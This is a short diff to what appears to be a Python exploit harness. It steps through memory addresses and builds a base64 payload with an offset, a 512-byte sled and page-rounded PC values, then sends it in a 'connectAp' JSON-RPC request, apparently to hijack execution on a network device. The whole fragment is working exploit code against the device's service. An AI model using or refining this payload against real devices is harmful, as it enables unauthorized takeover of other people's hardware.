@@ -78,7 +78,8 @@ def main():
         idx = start_idx + i
         addr = BASE + idx * step
         marker = None
-        b64 = T.build(OFF := 1060, marker, addr, sled=0, padpc=1, prefix=b"", bare=False, hang=True)
+        b64 = T.build(OFF := 1060, marker, addr, sled=512, padpc=1, prefix=b"", bare=False,
+                     sledfill=True, pcround=0x1000, hang=True)
         body = {"method": "connectAp", "params": T.connect_params(b64, "Aardvark", "00:00:00:00:00:00")}
         t0 = time.time()
         try:
